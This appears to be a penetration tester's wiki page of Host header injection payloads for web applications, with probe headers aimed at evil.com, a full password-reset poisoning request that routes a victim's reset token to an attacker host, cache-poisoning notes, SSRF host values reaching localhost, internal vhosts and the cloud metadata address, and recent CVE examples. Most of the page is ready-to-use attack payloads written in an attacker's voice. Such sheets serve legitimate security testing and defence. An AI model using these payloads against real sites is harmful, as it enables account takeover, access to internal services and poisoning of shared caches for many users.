---
title: "Payloads: Host Header Injection"
type: payloads
tags: [payloads, host-header, misconfig, ssrf, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-11-11
---

# Host Header Injection

Abuse a trusted/reflected `Host` (OWASP A05). Drives password-reset poisoning, cache poisoning, SSRF, and auth bypass. See [[http-host-header-attacks]]; reset chain [[wiki/techniques/web/account-takeover]].

## Probes
```
Host: evil.com                                  # does the app use it (links/redirects/emails)?
Host: target.com\r\nX: evil                     # CRLF in host
X-Forwarded-Host: evil.com                      # often unkeyed + trusted
X-Host: evil.com   X-Forwarded-Server: evil.com   Forwarded: host=evil.com
Host: target.com:80@evil.com   Host: evil.com:80
duplicate Host: target.com \n Host: evil.com    # which one wins?
absolute URL line: GET https://target.com/ + Host: evil.com
```

## Password reset poisoning (-> ATO)
```http
POST /reset HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com

email=victim@t.com
```
Victim gets `https://evil.com/reset?token=...` -> token to attacker. See `wiki/payloads/auth-bypass.md`.

## Web cache poisoning
Unkeyed `X-Forwarded-Host` reflected into a script/link -> cached for all users -> XSS/resource swap. See `wiki/payloads/web-cache.md`.

## Routing-based SSRF / auth bypass
```
Host: localhost     Host: 127.0.0.1     Host: 169.254.169.254   # reach internal vhosts / metadata
Host: internal-admin.corp                                       # access internal-only vhost
Host: target.com -> /admin gated by Host -> spoof to bypass
```

## Real-world
`X-Forwarded-Host` reset poisoning is a classic ATO; routing-based SSRF via Host (Kettle research) reaches internal apps/metadata through the front-end. Always test what consumes the Host value.

## NEW 2025-2026

1. **Flask `url_for(external=True)` reset poisoning class** (CVE-2025-61136,
   sharewarez v2.4.3): reset links built from the request host without a fixed
   `SERVER_NAME`; send `Host: evil` on the reset request, the emailed link points at
   the attacker. Test EVERY link-generating endpoint (reset, invite, magic login,
   webhook confirmations).
   https://nvd.nist.gov/vuln/detail/CVE-2025-61136
2. **Kanboard GHSA-2ch5-gqjm-8p92** (2025 real instance): password reset poisoning via
   `Host` / `X-Forwarded-Host` - the modern default bug shape: framework trusts
   forwarded headers when behind a proxy that does not strip them.
3. **Cache-key pairing**: Host + web-cache-deception/CP combos - a poisoned Host cached
   on a shared edge turns a self-affecting poison into multi-victim; check
   `X-Cache`/`CF-Cache-Status` on Host-varied responses.
4. **Absolute-URI differential**: `GET http://evil/ HTTP/1.1` with mismatched Host -
   proxy-vs-origin disagreement on which wins is the smuggling-adjacent tell.
